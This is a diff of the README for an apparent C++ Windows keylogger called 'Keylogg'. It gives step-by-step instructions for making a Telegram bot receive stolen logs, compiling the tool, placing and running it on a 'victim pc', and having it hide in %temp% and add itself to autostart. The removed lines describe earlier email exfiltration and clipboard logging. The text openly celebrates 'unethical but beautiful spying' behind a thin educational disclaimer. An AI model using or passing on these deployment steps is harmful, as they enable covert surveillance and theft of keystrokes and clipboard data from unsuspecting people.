@@ -1,32 +1,55 @@
-## Default Instalation:
-* Enable the [less secure apps](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg)
-* Set the const variables in .cpp (don't forgot to encrypt strings)
-* Compile it
-* Run the keylogger (but not as admin)
-* Enjoy
+# Keylogg
+## Description
+* Keylogger that sends you it logs to telegram channel
+## Using
+* [Create and set a telegram bot](#Create-and-set-a-telegram-bot)
+* [Set const variables](#Set-const-variables)
+* [Compile](#Compile)
+* [Install on victim pc](#install-on-victim-pc)
+* [Autostart](#Autostart)
+* [About project](#About-Project)
+* [Disclaimer](#Disclaimer)
 
-## Instalation if ur target use windows older than 1706
-* In the function send() in string "cmd" add .exe after "curl"
-* After ```<< "\nmove " + decrypt(exe_name + "!&ufnq&")+"\n" ``` add in the function autostart() this:
-``` 
- << "move curl.exe %temp%\n";
- << "move curl-ca-bundle.crt %temp%\n";
- << "move libcurl-x64.def %temp%\n";
- << "move libcurl-x64.dll %temp%\n";   
-```
-* To same directory where keylogger is gonna boot first time  put files from /bin/ from [curl for windows](https://curl.se/windows/) (32bit version)
-* Back to Default Instalation
+### Create and set a telegram bot
+#### Create your bot
+* First in Telegram's search bar write `@BotFather`
+* In chat with `BotFather` text him `/newbot`
+* Name your bot
+* `BotFather` will send you your api token, save it somewhere, you'll need it later
+* Text to BotFather `/setprivacy`
+* Choose your bot
+* Text him `Disable`
+#### Create a channel
+* Create a new channel
+* Add your bot as admin
 
-- [x] automaticly installing and adding to autostart
-- [x] sending logs on email
-- [x] Logging date every half an hour
-- [x] Logging Clipboard
-- [ ] encrypt logs
-- [ ] hide it from taskmanager
+### Set const variables
+* First send any message on your telegram channel
+* Then go to `https://api.telegram.org/bot<api Token>/getUpdates` and find `"id"` 
+* Your token is [there](#Create-and-set-a-telegram-bot) 
+* After that set `keylogg.hpp - > BOTAPI` as your api token
+* And `keylogg.hpp -> CHAT_ID` as your id that you find before
+* Set `keylogg.hpp -> LOGFILENAME` as name of file where logs will be
 
-[VirusTotal scan](https://www.virustotal.com/gui/file/22e1be46de7e6be7efe9d6edbf02d9ea0429a13bf5748db916c7a5a94aa9f18d/detection)
-
-if you don't need all of these features, just keylogger - checkout my older keylogger project
-
-
+### Compile
+* To directory with repo put [cpr](https://github.com/whoshuu/cpr) lib
+#### MSVC
+* Create project with `keylogg.hpp` and `main.cpp`
+* Go to Project -> <Project Name> propeties -> Advanced -> Character Set -> Use Multi-Byte
+* Compile
+* If you have problem with compiling or anything else DM me on Discord (my tag is in github profile description)
+ 
+ ### Install on victim pc
+* Put it anywhere you want (If you have turned on [autostart](#autostart) it will copy itself to %temp% else you have to hide it manually and add it to autostart)
+* Run it
+* enjoy unethical but beautiful spying!
+ 
+ ### Autostart
+* you can put your executable whenever you want, it will automaticly copy it self to %temp% and add to autostart
+ 
+ ### About Project
+ Actually I'm developing it solo but if you want to help me with this half shitty and half stackoverflow code text me on discord (my tag in github profile description), if you have any problems with using this soft text me too
+ 
+### Disclaimer
+Whole this project is only for eductional purposes, I am not responsible for anything you did or will do with this software
 
